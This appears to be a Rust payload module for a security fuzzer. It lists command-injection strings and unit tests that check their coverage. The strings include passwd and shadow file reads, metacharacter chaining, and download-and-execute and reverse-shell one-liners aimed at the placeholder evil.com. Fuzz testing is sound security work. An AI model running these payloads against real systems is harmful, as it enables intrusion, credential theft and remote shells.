use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Cmd,
            payload: ";cat /etc/passwd".to_string(),
            description: "Command injection - semicolon cat passwd".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "|cat /etc/passwd".to_string(),
            description: "Command injection - pipe cat passwd".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "`cat /etc/passwd`".to_string(),
            description: "Command injection - backtick command substitution".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "$(cat /etc/passwd)".to_string(),
            description: "Command injection - $() command substitution".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "&& cat /etc/passwd".to_string(),
            description: "Command injection - double ampersand".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "|| cat /etc/passwd".to_string(),
            description: "Command injection - double pipe".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "|whoami".to_string(),
            description: "Command injection - pipe whoami".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: ";whoami".to_string(),
            description: "Command injection - semicolon whoami".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "\nwhoami\n".to_string(),
            description: "Command injection - newline injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "newline".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "%0awhoami%0a".to_string(),
            description: "Command injection - URL encoded newlines".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "encoding".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "id".to_string(),
            description: "Command injection - basic id command".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "&& id".to_string(),
            description: "Command injection - double ampersand id".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "|id".to_string(),
            description: "Command injection - pipe id".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: ";id".to_string(),
            description: "Command injection - semicolon id".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "id;uname -a".to_string(),
            description: "Command injection - multiple commands".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "cat /etc/shadow".to_string(),
            description: "Command injection - read shadow file".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "ls -la /".to_string(),
            description: "Command injection - list root directory".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "curl -fsSL https://evil.com/shell.sh | sh".to_string(),
            description: "Command injection - remote code download".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "wget https://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh".to_string(),
            description: "Command injection - wget download and execute".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "bash -i >& /dev/tcp/evil.com/4444 0>&1".to_string(),
            description: "Command injection - reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "nc -e /bin/sh evil.com 4444".to_string(),
            description: "Command injection - netcat reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "python -c 'import socket,subprocess,os;s=socket.socket()'".to_string(),
            description: "Command injection - python reverse shell start".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "shell".to_string(), "python".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'".to_string(),
            description: "Command injection - PHP reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "shell".to_string(), "php".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444 >/tmp/f".to_string(),
            description: "Command injection - named pipe reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "uname -a".to_string(),
            description: "Command injection - system info".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "cat /proc/version".to_string(),
            description: "Command injection - kernel version".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "env".to_string(),
            description: "Command injection - environment variables".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "linux".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "echo test".to_string(),
            description: "Command injection - basic echo test".to_string(),
            severity: Severity::Medium,
            tags: vec!["cmd".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "|echo test".to_string(),
            description: "Command injection - piped echo".to_string(),
            severity: Severity::Medium,
            tags: vec!["cmd".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: ";echo test".to_string(),
            description: "Command injection - semicolon echo".to_string(),
            severity: Severity::Medium,
            tags: vec!["cmd".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "ls".to_string(),
            description: "Command injection - basic ls".to_string(),
            severity: Severity::Low,
            tags: vec!["cmd".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "dir".to_string(),
            description: "Command injection - Windows dir".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "type C:\\Windows\\win.ini".to_string(),
            description: "Command injection - Windows read file".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "cmd /c dir".to_string(),
            description: "Command injection - Windows cmd.exe".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "cmd /c whoami".to_string(),
            description: "Command injection - Windows whoami".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "cmd /c ipconfig".to_string(),
            description: "Command injection - Windows ipconfig".to_string(),
            severity: Severity::High,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "| powershell -Command \"whoami\"".to_string(),
            description: "Command injection - PowerShell whoami".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "windows".to_string(), "powershell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cmd,
            payload: "& whoami &".to_string(),
            description: "Command injection - Windows ampersand chain".to_string(),
            severity: Severity::Critical,
            tags: vec!["cmd".to_string(), "windows".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(
            !payloads.is_empty(),
            "Command injection payloads must not be empty"
        );
    }

    #[test]
    fn all_payloads_are_cmd_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Cmd);
        }
    }

    #[test]
    fn contains_shell_metacharacters() {
        let payloads = get_payloads();
        let has_semicolon = payloads.iter().any(|p| p.payload.contains(';'));
        let has_pipe = payloads.iter().any(|p| p.payload.contains('|'));
        let has_backtick = payloads.iter().any(|p| p.payload.contains('`'));
        let has_dollar_paren = payloads.iter().any(|p| p.payload.contains("$("));
        assert!(has_semicolon, "Must contain semicolon (;) injection");
        assert!(has_pipe, "Must contain pipe (|) injection");
        assert!(has_backtick, "Must contain backtick (`) injection");
        assert!(has_dollar_paren, "Must contain $() command substitution");
    }

    #[test]
    fn contains_etc_passwd_read() {
        let payloads = get_payloads();
        let has_passwd = payloads.iter().any(|p| p.payload.contains("/etc/passwd"));
        assert!(has_passwd, "Must contain /etc/passwd read payloads");
    }

    #[test]
    fn contains_reverse_shell() {
        let payloads = get_payloads();
        let has_reverse = payloads.iter().any(|p| {
            p.payload.contains("/dev/tcp")
                || p.payload.contains("nc -e")
                || p.payload.contains("fsockopen")
        });
        assert!(has_reverse, "Must contain reverse shell payloads");
    }

    #[test]
    fn contains_windows_commands() {
        let payloads = get_payloads();
        let has_windows = payloads
            .iter()
            .any(|p| p.payload.contains("cmd /c") || p.payload.contains("powershell"));
        assert!(
            has_windows,
            "Must contain Windows command injection payloads"
        );
    }

    #[test]
    fn almost_all_critical() {
        let payloads = get_payloads();
        let critical_count = payloads
            .iter()
            .filter(|p| p.severity == Severity::Critical)
            .count();
        let ratio = critical_count as f64 / payloads.len() as f64;
        assert!(
            ratio >= 0.6,
            "At least 60% of cmd payloads should be Critical, got {:.0}%",
            ratio * 100.0
        );
    }

    #[test]
    fn contains_chained_commands() {
        let payloads = get_payloads();
        let has_and = payloads.iter().any(|p| p.payload.contains("&&"));
        let has_double_pipe = payloads.iter().any(|p| p.payload.contains("||"));
        assert!(has_and, "Must contain && chaining");
        assert!(has_double_pipe, "Must contain || chaining");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 20,
            "Must have substantial cmd injection coverage, got {}",
            payloads.len()
        );
    }
}
